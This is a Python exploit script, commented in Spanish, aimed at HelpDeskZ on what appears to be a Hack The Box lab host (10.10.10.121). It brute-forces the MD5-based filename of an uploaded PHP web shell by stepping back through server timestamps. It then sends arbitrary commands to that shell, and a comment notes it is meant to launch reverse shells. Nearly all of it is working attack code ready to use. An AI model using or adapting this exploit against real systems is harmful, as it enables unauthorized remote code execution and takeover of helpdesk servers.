#!/usr/bin/python3

import requests, hashlib, calendar
import signal, time, argparse
from os import path
from pwn import *

# -- CTRL+C
def def_handler(sig, frame):
    print(Color.RED + "\n[!] Oki, saliendo...\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# -- Clases
class Color:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    END = '\033[0m'

class BienMal:
    BIEN = Color.GREEN + "✔" + Color.END
    MAL = Color.RED + "✘" + Color.END

# -- Funciones del programa
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument('-c', dest='command', type=str, default='id', help='Command to execute - Default: id')
    parse.add_argument('-d', dest='depth', type=int, default='300', help='Depth to find uploaded file - Default: 300')
    return parse.parse_args()

# Buscamos el archivo subido iterando en intervalos de tiempo
def find_file(depth):
    URL = "http://10.10.10.121"
    filename_payload = "holiwis.php"

    p1 = log.progress("Encontrando archivo")

    r = requests.head(URL)
    date = r.headers['Date']
    time_format = "%a, %d %b %Y %H:%M:%S %Z"
    current_time = int(calendar.timegm(time.strptime(date,time_format)))

    for timelapse in range(0, depth):
        found = 0
        file_time = filename_payload + str(current_time - timelapse)
        hashMD5 = hashlib.md5(file_time.encode()).hexdigest()
        find_file_url = URL + '/support/uploads/tickets/' + hashMD5 + ".php"

        p1.status("%s - %d/%d" % (find_file_url, timelapse, depth))

        # Example find_file_url: http://10.10.10.121/support/uploads/tickets/93238997feea99265dae5816a1ccc8fd.php
        r = requests.head(find_file_url)
        if r.status_code == 200:
            name_file_found = open(filename_url_found, 'w')
            name_file_found.write(find_file_url)
            name_file_found.close()
            p1.success("%s %s" % (find_file_url, BienMal.BIEN))
            found = 1
            time.sleep(1)
            break

    if found == 0:
        print(Color.RED + "\n[-] No encontramos tu archivo, intenta darle más profundidad de busqueda (-d) o volver a subirlo." + Color.END)
        p1.failure(BienMal.MAL)
        exit(1)

# Ejecutamos comandos en el sistema mediante el archivo subido
def command_execution(url_RCE, command):
    p2 = log.progress("Ejecutando " + Color.CYAN + command + Color.END + " en el sistema")

    # En caso de ejecutar alguna reverse shell, así evitamos que la petición se nos quede pegada. Pasan 3 segundos y la cierra
    try:
        r = requests.get(url_RCE, params={"xmd":command}, timeout=3)
        if r.status_code != 200:
            print(Color.RED + "\n[-] Esa URL nos da error, lo más seguro es que el archivo haya sido borrado, sube uno nuevo." + Color.END)
            p2.failure(BienMal.MAL)
            exit(1)
        else:
            print(Color.CYAN + "\n" + r.text + Color.END)
    except requests.exceptions.Timeout:
        pass

    p2.success(BienMal.BIEN)

# -- Variables globales
filename_url_found = "url_found_helpdeskz.txt"

if '__main__' == __name__:
    args = arguments()

    # En la funcion que busca el archivo generamos un objeto con la URL encontrada, hacemos esto para evitar buscarla cada vez que ejecutamos el script
    if path.exists(filename_url_found) == False:  
        find_file(args.depth)

    name_file_found = open(filename_url_found, 'r')
    url_RCE = name_file_found.readlines()[0].strip()  # Toma si o si la primera linea del archivo, o sea, la URL
    name_file_found.close()

    command_execution(url_RCE, args.command)

    print(Color.GREEN + "[+] A r0mp3r t0do!")